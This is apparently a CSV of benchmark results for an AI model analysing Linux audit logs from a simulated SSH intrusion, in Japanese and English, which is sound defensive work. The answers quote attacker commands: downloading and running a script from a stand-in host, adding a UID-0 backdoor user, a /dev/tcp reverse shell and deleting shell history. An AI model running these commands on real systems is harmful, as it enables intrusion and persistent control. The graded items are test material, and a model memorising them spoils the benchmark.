+| 2026‑11‑17 07:03:53 | `nagios` で SSH ログイン成功 |
+| 2026‑11‑17 07:03:56 | `id` コマンド実行（自分の UID/GID 確認） |
+| 2026‑11‑17 07:04:01 | `uname -a` 実行（カーネル情報取得） |
+| 2026‑11‑17 07:04:06 | `cat /etc/passwd` 実行（ユーザーリスト取得） |
+| 2026‑11‑17 07:04:15 | `sudo wget -q http://198.51.100.39/fix.sh -O /tmp/.fix.sh` ダウンロード |
+| 2026‑11‑17 07:04:20 | `sudo chmod +x /tmp/.fix.sh` 実行権限付与 |
+| 2026‑11‑17 07:04:23 | `sudo bash /tmp/.fix.sh` ダウンロードしたスクリプト実行 |
+| 2026‑11‑17 07:04:24 | `sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash dbmaint` で UID 0 のユーザー `dbmaint` を作成 |
+| 2026‑11‑17 07:04:24 | `/etc/cron.d/dbmaint` が作成（cron による持続化） |
+| 2026‑11‑17 07:04:26 | `bash` から `connect` 系システムコールで **198.51.100.39:5555** へ接続を試行（失敗） |
+| 2026‑11‑17 07:05:03 | `rm /home/nagios/.bash_history` でコマンド履歴削除 |
+| 2026‑11‑17 07:05:05 | SSH セッション終了（ログアウト） |
+
+**(5) 攻撃者が接続しようとした外部の IP アドレスとポート番号**  
+`SOCKADDR` の内容 `020015B3C6336427...` を解読すると:  
+
+- IP アドレス: **198.51.100.39**  
+- ポート番号: **5555**（0x15B3）
+
+**(6) 後で再侵入するために仕掛けられたもの**  
+
+| 仕掛けたもの | 説明 |
+|--------------|------|
+| ユーザー `dbmaint`（UID 0） | `useradd` により root 権限を持つ新規ユーザーが作成 |
+| Cron ジョブ `/etc/cron.d/dbmaint` | 定期実行で永続的に何らかのスクリプトを走らせる可能性 |
+| ダウンロードされたスクリプト `/tmp/.fix.sh` | 実行されたが残存している可能性（削除記録なし） |
+
+---
+
+### JSON での結論
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.173"",
+  ""account"": ""nagios"",
+  ""login_time"": ""2026-11-17 07:03:53"",
+  ""c2_ip"": ""198.51.100.39"",
+  ""c2_port"": 5555,
+  ""actions"": [
+    ""login as nagios via SSH"",
+    ""run id"",
+    ""run uname -a"",
+    ""cat /etc/passwd"",
+    ""sudo wget -q http://198.51.100.39/fix.sh -O /tmp/.fix.sh"",
+    ""sudo chmod +x /tmp/.fix.sh"",
+    ""sudo bash /tmp/.fix.sh"",
+    ""sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash dbmaint"",
+    ""create /etc/cron.d/dbmaint"",
+    ""attempt connect to 198.51.100.39:5555"",
+    ""rm /home/nagios/.bash_history"",
+    ""logout""
+  ],
+  ""persistence"": [
+    ""user dbmaint (UID 0) added"",
+    ""cron job /etc/cron.d/dbmaint created""
+  ]
+}
+```",1,1,329.21,stop,6871,quiz,False,0.0,9,11,True
+2026-11-14T14:46:01,quiz-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,quiz_set/inc5/audit.log,1,6181,39821.2,155.22,3241,221148.8,14.65,260.97,"{""侵害ありと判定"": true, ""攻撃元 IP"": true, ""アカウント"": true, ""侵入時刻（±60秒）"": true, ""接続先 IP"": true, ""接続先ポート"": true, ""スクリプトの取得・実行"": true, ""UID 0 の利用者の追加"": true, ""cron の仕掛け"": true, ""SSH 鍵の仕掛け"": false, ""痕跡の消去"": true}","**(1) 侵害の有無**  
+このサーバーは侵害されています。根拠となるレコードの `type` は以下です。  
+
+- `USER_AUTH`（成功した認証）  
+- `LOGIN`（ログイン成功）  
+- `USER_START`、`USER_LOGIN`（セッション開始）  
+- `SYSCALL` / `EXECVE`（コマンド実行）  
+- `USER_ACCT`、`USER_CMD`（sudo 実行）  
+- `ADD_USER`（新規ユーザー作成）  
+- `PATH`（ファイル作成・削除）  
+
+**(2) 攻撃元 IP と使用アカウント**  
+- 攻撃元 IP アドレス：`203.0.113.107`（SSH 接続元）  
+- 侵入に使われたアカウント：`report`（`USER_AUTH` が `res=success`）
+
+**(3) 侵入に成功した時刻**  
+`USER_AUTH` が成功したレコードは  
+
+```
+type=USER_AUTH msg=audit(1794409462.616:28390): ... acct=""report"" ...
+```
+
+`1794409462` は Unix epoch 秒です。  
+UTC 時間は **2026‑11‑11 15:04:22**、日本時間 (JST, UTC+9) に直すと **2026‑11‑12 00:04:22** です。
+
+**(4) 侵入後に行われた操作（時系列）**  
+
+| 時刻 (JST) | 操作内容 |
+|------------|----------|
+| 2026‑11‑12 00:04:22 | SSH で `report` ユーザーがログイン |
+| 2026‑11‑12 00:04:22 | `id` コマンド実行 |
+| 2026‑11‑12 00:04:22 | `uname -a` 実行 |
+| 2026‑11‑12 00:04:22 | `cat /etc/passwd` 実行（内容取得） |
+| 2026‑11‑12 00:04:23 | `sudo wget -q http://198.51.100.197/sync.sh -O /tmp/.sync.sh` ダウンロード |
+| 2026‑11‑12 00:04:23 | `sudo chmod +x /tmp/.sync.sh` 実行権限付与 |
+| 2026‑11‑12 00:04:23 | `sudo bash /tmp/.sync.sh` スクリプト実行 |
+| 2026‑11‑12 00:04:24 | `sudo useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync` 新規ユーザー作成 |
+| 2026‑11‑12 00:04:24 | `/etc/cron.d/logsync` に cron エントリ作成（永続化） |
+| 2026‑11‑12 00:04:25 | `bash` から外部 IP 198.51.100.197:5555 へ接続試行（失敗） |
+| 2026‑11‑12 00:04:27 | `rm /home/report/.bash_history` （コマンド履歴削除） |
+
+**(5) 攻撃者が接続しようとした外部 IP とポート**  
+`SOCKADDR` レコード  
+
+```
+type=SOCKADDR msg=audit(1794409506.533:28463): saddr=020015B3C63364C5...
+```
+
+- `02 00` → AF_INET (IPv4)  
+- ポート: `15 B3` (ネットワークバイト順) → 0x15B3 = **5555**  
+- IP アドレス: `C6 33 64 C5` → **198.51.100.197**  
+
+したがって、攻撃者が接続しようとした先は **198.51.100.197:5555** です。
+
+**(6) 再侵入のために仕掛けられたもの**  
+
+- 新規ユーザー **logsync**（UID 0、GID 0、シェル /bin/bash、ホーム /root）  
+- `/etc/cron.d/logsync` に作成された cron ジョブ（定期的にスクリプト等を実行させる）  
+
+（`/root/.ssh/authorized_keys` が参照されただけで書き込みは記録されていないため、ここからは仕掛けは確認できません。）
+
+---
+
+### JSON まとめ
+
+```json
+{
+  ""compromised"": true,
+  ""attacker_ip"": ""203.0.113.107"",
+  ""account"": ""report"",
+  ""login_time"": ""2026-11-12 00:04:22"",
+  ""c2_ip"": ""198.51.100.197"",
+  ""c2_port"": 5555,
+  ""actions"": [
+    ""id"",
+    ""uname -a"",
+    ""cat /etc/passwd"",
+    ""wget -q http://198.51.100.197/sync.sh -O /tmp/.sync.sh"",
+    ""chmod +x /tmp/.sync.sh"",
+    ""bash /tmp/.sync.sh"",
+    ""useradd -o -u 0 -g 0 -M -d /root -s /bin/bash logsync"",
+    ""cron file created /etc/cron.d/logsync"",
+    ""network connect attempt to 198.51.100.197:5555 (failed)"",
+    ""rm /home/report/.bash_history""
+  ],
+  ""persistence"": [
+    ""user logsync (UID 0) created"",
+    ""cron job /etc/cron.d/logsync""
+  ]
+}
+```",1,1,260.99,stop,5565,quiz,False,0.0,10,11,True
+2026-11-14T14:51:38,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,1,5707,80078.1,71.27,714,179211.9,3.98,259.29,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+1. **Brute‑force SSH attempts** – Several consecutive `USER_AUTH` events show repeated failed password attempts for the `root` account from the remote address **203.0.113.45**.
+
+2. **Successful login** – The same IP finally authenticates successfully as the non‑privileged user **`backup`** (auid = 1003). A PAM session is opened and the user obtains a shell on `/dev/pts/1`.
+
+3. **Post‑login activity by `backup`** – After login the user runs a few harmless commands (`id`, `uname -a`, `cat /etc/passwd`).  
+
+4. **Privilege escalation via sudo** – The user repeatedly invokes `sudo`:
+   - Downloads a script from **http://198.51.100.23/upd.sh** with `wget -q -O /tmp/.upd.sh`.
+   - Makes the script executable (`chmod +x /tmp/.upd.sh`).
+   - Executes the script (`bash /tmp/.upd.sh`).
+
+5. **Creation of a backdoor account** – Using `sudo`, the attacker runs `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`, thereby creating a new user **`sysupd`** with UID 0 (full root privileges). The `ADD_USER` record confirms the successful addition.
+
+6. **Persistence mechanisms** –  
+   - A cron file **/etc/cron.d/sysupd** is created (recorded under `key=""cron""`).  
+   - The attacker reads/writes **/root/.ssh/authorized_keys**, likely to add their own SSH key for future access.
+
+7. **Network connection attempt** – A failed `socket` syscall (key = `network_connect`) shows an attempt to connect to **198.51.100.23:4444**, probably the C2 server the downloaded script contacts.
+
+8. **Cover‑up** – The user deletes their `.bash_history` file (`rm /home/backup/.bash_history`) to erase traces.
+
+9. **Session termination** – The SSH session is closed cleanly (`USER_END` / `USER_LOGOUT`).
+
+**Overall assessment:** The log captures a classic SSH brute‑force followed by a successful compromise of a low‑privilege account, escalation to root via `sudo`, download and execution of a malicious payload, creation of a root‑equivalent backdoor user, establishment of persistence (cron and authorized_keys), and an attempt to contact an external C2 server. Immediate incident response actions should include terminating the compromised session, revoking the newly added `sysupd` account, removing the malicious cron entry and script, rotating SSH keys, and conducting a full forensic investigation of the host.",4,1,264.85,stop,512,summary,False,0.7,,,
+2026-11-14T14:51:38,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,1,5707,42632.5,133.87,620,103155.0,6.0,145.79,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit Log Summary**
+
+1. **Brute‑force SSH attempts** – Several rapid failed PAM authentication events for the accounts **root** and **backup** from the same remote host `203.0.113.45`.  
+
+2. **Successful compromise** – The account **backup** finally authenticates successfully (PAM `res=success`) and opens an SSH session (pts/1).
+
+3. **Post‑login activity (UID 1003 – backup)**  
+   * Runs basic discovery commands: `id`, `uname -a`.  
+   * Reads `/etc/passwd` with `cat`.  
+
+4. **Privilege escalation via sudo** – The compromised user invokes `sudo` repeatedly:  
+   * Downloads a malicious script `http://198.51.100.23/upd.sh` to `/tmp/.upd.sh` with `wget -q -O /tmp/.upd.sh`.  
+   * Makes the script executable (`chmod +x /tmp/.upd.sh`).  
+   * Executes the script (`bash /tmp/.upd.sh`).  
+
+5. **Creation of a persistent back‑door** – While running as root (through sudo):  
+   * Adds a new system account **sysupd** with UID/GID 0 (root) using `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`.  
+   * Writes a new cron file `/etc/cron.d/sysupd` (likely to run the malicious script on a schedule).  
+   * Modifies `/root/.ssh/authorized_keys` (adds a key for future root logins).  
+
+6. **Cleanup** – Deletes the user’s command history file (`/home/backup/.bash_history`) with `rm`, erasing evidence of the session.
+
+7. **Session termination** – The SSH session for **backup** is closed cleanly.
+
+**Overall assessment:**  
+The log shows an attacker performing a brute‑force SSH attack, gaining access via the `backup` account, using `sudo` to download and execute a payload, then establishing persistence (root‑owned user, cron job, SSH key) and covering tracks by deleting the bash history. This is a classic post‑compromise escalation and persistence pattern.",4,2,264.85,stop,573,summary,False,0.7,,,
+2026-11-14T14:51:38,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,1,5707,39977.9,142.75,797,211948.8,3.76,251.93,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit Log Summary**
+
+1. **Brute‑force SSH attempts** – Several rapid failed PAM authentication events for the accounts **root** and **backup** from the remote address **203.0.113.45**.
+
+2. **Successful login** – The **backup** account finally authenticates successfully (PID 47962) from the same IP and opens an SSH session (pts/1).
+
+3. **Post‑login activity (user backup, UID 1003)**  
+   - Executed basic discovery commands: `id`, `uname -a`, and read `/etc/passwd`.  
+   - Used **sudo** to run privileged commands:
+     * Downloaded a script from **http://198.51.100.23/upd.sh** with `wget -q … -O /tmp/.upd.sh`.  
+     * Made the script executable (`chmod +x /tmp/.upd.sh`).  
+     * Executed the script via `bash /tmp/.upd.sh`.
+
+4. **Persistence / privilege escalation (executed by the downloaded script)**  
+   - Created a new system account **sysupd** with UID/GID 0 (root) and home `/root` (`useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`).  
+   - Added a cron job file **/etc/cron.d/sysupd** (likely to run the script or a backdoor on a schedule).  
+   - Accessed `/root/.ssh/authorized_keys` (read/write) – possibly to plant an SSH key for persistent access.  
+   - Attempted a network connection from a bash command (`bash -c ""… > /dev/tcp/198.51.100.23/4444""`), indicating a reverse‑shell attempt to the same external host.
+
+5. **Cover‑track** – Deleted the user’s `.bash_history` file (`rm /home/backup/.bash_history`) before ending the session.
+
+6. **Session termination** – The SSH session for **backup** is closed cleanly.
+
+7. **Unrelated system events** – Normal start/stop of `systemd-tmpfiles-clean` service.
+
+**Overall picture:** An attacker performed a brute‑force SSH attack, gained access with the “backup” account, escalated privileges by creating a root‑equivalent user and a cron job, installed a backdoor script fetched from an external server, attempted a reverse shell, and erased command history to hide activity. This is a clear compromise requiring immediate incident response (account lockout, credential rotation, forensic analysis, and remediation of the added user/cron job and any planted keys or binaries).",4,3,264.85,stop,962,summary,False,0.7,,,
+2026-11-14T14:51:38,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,1,5707,53698.5,106.28,641,133732.9,4.79,187.43,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+1. **Brute‑force SSH attempts** – Several rapid failed authentication attempts for the accounts *root* and *backup* from the external IP **203.0.113.45**.
+
+2. **Successful login** – The *backup* account eventually logged in successfully (session 2) from the same IP.
+
+3. **Post‑login activity (backup user)**  
+   * Ran basic commands (`id`, `uname -a`, `cat /etc/passwd`).  
+   * Used **sudo** to download a script from **http://198.51.100.23/upd.sh** via `wget -q -O /tmp/.upd.sh`.  
+   * Made the script executable (`chmod +x /tmp/.upd.sh`) and executed it with `bash /tmp/.upd.sh`.
+
+4. **Persistence setup** – While running as root (via sudo) the attacker:
+   * Created a new user **sysupd** with UID/GID 0 (effectively another root account) using `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`.  
+   * Added a cron file **/etc/cron.d/sysupd** (likely to run the malicious script periodically).  
+   * Accessed `/root/.ssh/authorized_keys`, suggesting a possible addition of an SSH key for persistent remote access.
+
+5. **Cover‑track** – Deleted the user’s `.bash_history` file (`rm /home/backup/.bash_history`) to erase command traces.
+
+6. **Other events** – Normal systemd‑tmpfiles‑clean service start/stop messages later in the log.
+
+**Overall impression:** The log shows an attempted SSH brute‑force, a successful compromise of the *backup* account, privilege escalation via sudo, download and execution of a malicious payload, creation of a root‑equivalent backdoor user and a cron job for persistence, and cleanup of command history. This is indicative of a successful intrusion and post‑exploitation activity.",4,4,264.85,stop,870,summary,False,0.7,,,
+2026-11-14T14:56:01,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,2,5707,55185.6,103.41,669,139353.6,4.79,194.54,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+1. **Brute‑force SSH attempts** – Several rapid failed PAM authentication events for *root* and *backup* from the same remote address **203.0.113.45**.
+
+2. **Successful login** – The account **backup** finally authenticates successfully (PAM session opened) from that IP.
+
+3. **Post‑login activity (as backup)**  
+   * Runs basic commands (`id`, `uname -a`, `cat /etc/passwd`) – typical reconnaissance.  
+   * Uses **sudo** to obtain root privileges and executes:
+     * `wget -q http://198.51.100.23/upd.sh -O /tmp/.upd.sh` – downloads a malicious script.  
+     * `chmod +x /tmp/.upd.sh` – makes it executable.  
+     * `bash /tmp/.upd.sh` – runs the script.
+
+4. **Privilege escalation / persistence** (performed as root after the script runs):
+   * Creates a new account **sysupd** with UID 0 and GID 0 (`useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`) – effectively a second root‑level user.  
+   * Writes a new cron file **/etc/cron.d/sysupd** – giving the attacker periodic execution of their payload.  
+   * Adds a public key to **/root/.ssh/authorized_keys** – enabling future password‑less root SSH access.
+
+5. **Cleanup** – Deletes the attacker’s `.bash_history` file (`rm /home/backup/.bash_history`) to hide the activity.
+
+6. **Session termination** – The SSH session for *backup* is closed cleanly.
+
+**Overall picture:**  
+An attacker performed a password‑guessing attack, gained a foothold as the *backup* user, leveraged sudo to download and execute a malicious script, then created a root‑level backdoor user, installed a persistent cron job, added an SSH key for root, and erased command history to cover tracks. This is a classic post‑compromise escalation and persistence scenario.",4,1,263.19,stop,816,summary,False,0.7,,,
+2026-11-14T14:56:01,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,2,5707,56483.1,101.04,495,147418.8,3.35,203.9,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+- An external host (203.0.113.45) made a series of rapid SSH login attempts. All attempts for **root** failed, but a later attempt for the account **backup** succeeded.
+
+- After logging in as **backup** (auid = 1003), the attacker enumerated the system (`id`, `uname -a`) and read `/etc/passwd`.
+
+- Using **sudo**, the attacker downloaded a remote script (`http://198.51.100.23/upd.sh`) into `/tmp/.upd.sh`, marked it executable (`chmod +x`), and executed it with `bash`.
+
+- The script created a new privileged account **sysupd** (UID 0, GID 0, home = /root, shell = /bin/bash) and added a corresponding entry to `/etc/passwd`. It also created a cron file (`/etc/cron.d/sysupd`) to ensure persistence.
+
+- The attacker placed their SSH public key into `/root/.ssh/authorized_keys`, granting future root‑level SSH access.
+
+- A network‑connect attempt was logged (likely an outbound connection to 198.51.100.23 on port 4444).
+
+- Finally, the attacker cleaned up the session by deleting their `.bash_history` file and logging out.
+
+- The log ends with normal systemd‑tmpfiles‑clean service start/stop events.
+
+**Overall:** The log shows a successful compromise of the system via a valid user account, privilege escalation to root, creation of a backdoor user and SSH key, persistence via cron, and cleanup of evidence. This is a clear security breach.",4,2,263.19,stop,594,summary,False,0.7,,,
+2026-11-14T14:56:01,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,2,5707,40930.0,139.43,689,221955.5,3.1,262.89,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+- **Brute‑force SSH attempts:** Several consecutive `USER_AUTH` events show failed password attempts for the `root` account from the remote address 203.0.113.45.  
+
+- **Successful login:** The same IP then succeeds in authenticating as the low‑privilege user **`backup`** (audit record 23670/23674). A PAM session is opened and the user obtains a login UID of 1003.
+
+- **Post‑login activity (as `backup`):**  
+  1. The user runs basic discovery commands (`id`, `uname -a`) and reads `/etc/passwd`.  
+  2. Using `sudo` the user downloads a script from **http://198.51.100.23/upd.sh** to `/tmp/.upd.sh` with `wget -q … -O /tmp/.upd.sh`.  
+  3. The script is made executable (`chmod +x /tmp/.upd.sh`) and executed (`bash /tmp/.upd.sh`).  
+
+- **Privilege escalation / persistence:**  
+  * Inside the script (or immediately after) the attacker creates a new system account **`sysupd`** with UID 0 (root) and a login shell `/bin/bash`.  
+  * A cron file **`/etc/cron.d/sysupd`** is created, likely to re‑execute the malicious script periodically.  
+  * An SSH public key is added to **`/root/.ssh/authorized_keys`**, giving the attacker persistent root SSH access.  
+
+- **Network activity:** A failed `socket` syscall (type 42) shows an attempt to open a TCP connection to **198.51.100.23:4444**, probably a reverse‑shell or C2 callback that was blocked.
+
+- **Cleanup:** The attacker deletes their command history (`rm /home/backup/.bash_history`) and then logs out, closing the SSH session.
+
+- **Normal system events:** After the intrusion, the log records a normal start/stop of the `systemd-tmpfiles-clean` service.
+
+**Overall assessment:** The log captures a successful compromise of the system via SSH, escalation to root through a malicious script, creation of a privileged back‑door user and SSH key, and the planting of a cron job for persistence. Immediate incident response should focus on terminating the added user/cron entry, revoking the new SSH key, investigating the downloaded script, and reviewing other hosts for similar compromise.",4,3,263.19,stop,665,summary,False,0.7,,,
+2026-11-14T14:56:01,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,2,5707,42096.3,135.57,684,113976.4,5.99,156.07,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit‑d summary**
+
+1. **Brute‑force login attempts** – Several rapid `USER_AUTH` records show failed password checks for the accounts **root** and **backup** coming from the same remote host `203.0.113.45`.  
+
+2. **Successful login** – The `backup` account finally authenticates successfully (PAM `res=success`) from the same IP and a new session (auid 1003, ses 2) is opened.
+
+3. **Post‑login activity (user 1003 – “backup”)**  
+   * The user runs a few innocuous commands (`id`, `uname -a`, `cat /etc/passwd`) – typical reconnaissance.  
+   * Using **sudo** the user downloads a script from an external server (`http://198.51.100.23/upd.sh`) into `/tmp/.upd.sh` (`wget -q … -O /tmp/.upd.sh`).  
+   * The script is made executable (`chmod +x /tmp/.upd.sh`) and then executed with a Bash shell (`bash /tmp/.upd.sh`).  
+
+4. **Privilege escalation** – Inside the downloaded script (or immediately after) the attacker creates a new **root‑privileged account**:  
+
+   * `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd` – creates a user `sysupd` with UID 0 (full root rights).  
+   * An `ADD_USER` event confirms the successful addition of `sysupd`.  
+
+5. **Persistence mechanisms**  
+   * A cron file is created: `/etc/cron.d/sysupd` (recorded as a new file under `/etc/cron.d/`).  
+   * The attacker also accesses `/root/.ssh/authorized_keys`, likely to add a public key for future password‑less root logins.  
+
+6. **Cover‑track** – The attacker deletes the Bash history file of the `backup` user (`rm /home/backup/.bash_history`), erasing evidence of the commands run during the session.
+
+7. **Session termination** – The SSH session for `backup` is cleanly closed (`USER_END`, `USER_LOGOUT`).
+
+**Overall assessment**  
+The log shows a classic compromise workflow: an attacker brute‑forces SSH, gains access with a low‑privilege account (`backup`), performs reconnaissance, pulls and executes a remote script, escalates to root by creating a UID‑0 account, plants a cron job and possibly an SSH key for persistence, and then attempts to hide the activity by deleting command history. This activity is highly suspicious and indicates a successful intrusion with full system compromise.",4,4,263.19,stop,453,summary,False,0.7,,,
+2026-11-14T15:00:23,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,3,5707,42402.4,134.59,708,112766.1,6.27,155.17,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Audit log summary**
+
+1. **Brute‑force SSH attempts** – Several consecutive `USER_AUTH` events show failed password authentications for the accounts **root** and **backup** from the same remote address `203.0.113.45`.
+
+2. **Successful login** – The account **backup** finally authenticates successfully (PAM `res=success`) and a session is opened (USER_START, USER_LOGIN).  
+
+3. **Information gathering** – After login the user runs a few benign commands (`id`, `uname -a`, `cat /etc/passwd`) – all recorded as successful `execve` syscalls.
+
+4. **Privilege escalation / payload download** – Using `sudo` the user downloads a script from an external host (`http://198.51.100.23/upd.sh`) into `/tmp/.upd.sh` with `wget`, makes it executable (`chmod +x /tmp/.upd.sh`), and then executes it with `bash /tmp/.upd.sh`.
+
+5. **Creation of a back‑door account** – The downloaded script (or the user directly) runs `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`, creating a new account **sysupd** with UID 0 (full root privileges). This is logged as `ADD_USER` with `res=success`.
+
+6. **Persistence mechanisms** –  
+   * A cron file is created under `/etc/cron.d/sysupd`.  
+   * The script adds the attacker’s SSH public key to `/root/.ssh/authorized_keys`.  
+
+7. **Network connection attempt** – A failed `socket` syscall (`syscall=42`) shows an attempted outbound connection to `198.51.100.23` on port 4444 (likely the C2 server).
+
+8. **Cover‑track** – The user removes the Bash history file (`rm /home/backup/.bash_history`) to hide the activity.
+
+9. **Session termination** – The SSH session is cleanly closed (USER_END, USER_LOGOUT).
+
+10. **System housekeeping** – Normal `systemd-tmpfiles-clean` service start/stop events appear later and are unrelated to the intrusion.
+
+**Overall assessment:**  
+The log records a successful compromise of the system via a brute‑force SSH attack on the *backup* account, followed by privilege escalation, download and execution of a malicious script, creation of a root‑owned back‑door user, persistence through cron and authorized‑keys, and an attempt to contact an external command‑and‑control server. The attacker also tried to erase evidence by deleting the Bash history. This sequence is indicative of a full compromise.",4,1,261.43,stop,597,summary,False,0.7,,,
+2026-11-14T15:00:23,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,3,5707,55226.2,103.34,622,128896.8,4.82,184.12,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Summary of the audit log**
+
+- An external host (203.0.113.45) repeatedly tried to log in as **root** via SSH and failed, then succeeded logging in as the legitimate user **backup** (auid = 1003).  
+- After the successful SSH session, the *backup* user executed a few informational commands (`id`, `uname -a`, `cat /etc/passwd`) and then used **sudo** to run a series of privileged actions:
+  1. **wget** a remote script (`http://198.51.100.23/upd.sh`) into `/tmp/.upd.sh` and made it executable.  
+  2. Executed the downloaded script with **bash**.  
+  3. Ran **useradd** (as root) to create a new account **sysupd** with UID 0, GID 0, home `/root` and shell `/bin/bash` – effectively a second root‑equivalent account.  
+  4. Created a persistent **cron** file `/etc/cron.d/sysupd`.  
+  5. Modified `/root/.ssh/authorized_keys`, likely adding an attacker’s SSH key.  
+  6. Performed a network connection attempt to the attacker’s server (shown by the `network_connect` record).  
+  7. Deleted the user’s `.bash_history` to cover tracks.  
+
+- The session then closed cleanly, and normal system services (`systemd‑tmpfiles‑clean`) started/stopped afterwards.
+
+**Overall**: The log shows a successful compromise via a compromised “backup” account, privilege escalation through sudo, download and execution of malicious code, creation of a root‑privileged backdoor user and cron job, insertion of an SSH key for persistence, and evidence of attempt to hide activity.",4,2,261.43,stop,977,summary,False,0.7,,,
+2026-11-14T15:00:23,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,3,5707,56062.5,101.8,695,178960.0,3.88,235.02,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Summary of the audit log**
+
+1. **Brute‑force SSH attempts** – Several rapid failed PAM authentication events for the **root** account from the remote address **203.0.113.45**.  
+
+2. **Successful login** – The same IP successfully authenticates as the **backup** user (UID 1003) via SSH.
+
+3. **Post‑login activity** – The backup user runs a few benign commands (`id`, `uname -a`, `cat /etc/passwd`) and then uses **sudo** to:
+   * **Download** a script from `http://198.51.100.23/upd.sh` into `/tmp/.upd.sh` with `wget -q … -O /tmp/.upd.sh`.
+   * **Make the script executable** (`chmod +x /tmp/.upd.sh`) and **execute it** (`bash /tmp/.upd.sh`).
+
+4. **Privilege escalation / persistence** – The malicious script (executed as root via sudo) performs:
+   * Creation of a new privileged account **sysupd** (`useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`), effectively a back‑door root user.
+   * Writes a **cron job** (`/etc/cron.d/sysupd`) to run the downloaded script persistently.
+   * Adds the attacker’s SSH public key to **/root/.ssh/authorized_keys**, granting future root SSH access.
+   * Attempts a network connection to `198.51.100.23:4444` (seen in the failed `connect` syscall).
+
+5. **Cleanup** – The attacker deletes their command history (`rm /home/backup/.bash_history`) and ends the SSH session.
+
+6. **Normal system events** – Service start/stop messages for `systemd-tmpfiles-clean` are unrelated housekeeping.
+
+**Overall picture:** An attacker performed a password‑spraying attack on root, gained entry via a legitimate “backup” account, leveraged sudo to download and run a malicious payload, created a persistent root‑level backdoor user and cron job, planted an SSH key for future access, and covered tracks by erasing the user’s bash history. This sequence indicates a successful compromise and privilege escalation on the host.",4,3,261.43,stop,865,summary,False,0.7,,,
+2026-11-14T15:00:23,research2-gpt-oss-120b,unsloth/gpt-oss-120b-GGUF:Q4_K_M,out_audit/audit.log,3,5707,40260.1,141.75,610,207133.2,2.94,247.39,"{""attacker_ip"": true, ""account"": true, ""c2_ip"": true, ""sysupd"": true}","**Summary of the audit log**
+
+- An external host (203.0.113.45) tried several SSH logins as **root** – all failed.  
+- The same IP succeeded in logging in as the low‑privilege user **backup** (session 2).  
+
+- Once logged in, *backup* executed a few harmless commands (`id`, `uname`, `cat /etc/passwd`) and then used **sudo** to:
+
+  1. **Download** a script from a malicious server (http://198.51.100.23/upd.sh) into `/tmp/.upd.sh` with `wget`.  
+  2. **Make it executable** (`chmod +x /tmp/.upd.sh`).  
+  3. **Run** the script (`bash /tmp/.upd.sh`).  
+
+- The script (or the attacker) created a new account **sysupd** with UID 0 (root) via `useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysupd`.  
+
+- Persistence was added by:
+
+  * Creating a cron file `/etc/cron.d/sysupd`.  
+  * Accessing `/root/.ssh/authorized_keys` (likely to add a key).  
+
+- An attempted outbound connection to 198.51.100.23 on port 4444 (shown by a failed `connect` syscall) indicates the script tried to reach a C2 server.  
+
+- Finally, the attacker removed evidence by deleting `/home/backup/.bash_history` and closed the SSH session.
+
+**Overall picture:** After a brute‑force SSH attempt, the attacker compromised the system via the `backup` account, escalated to root, installed a back‑door (downloaded script, created a root‑owned user, added a cron job, possibly added an SSH key), and cleaned up traces. This is a classic post‑login privilege‑escalation and persistence chain.",4,4,261.43,stop,795,summary,False,0.7,,,
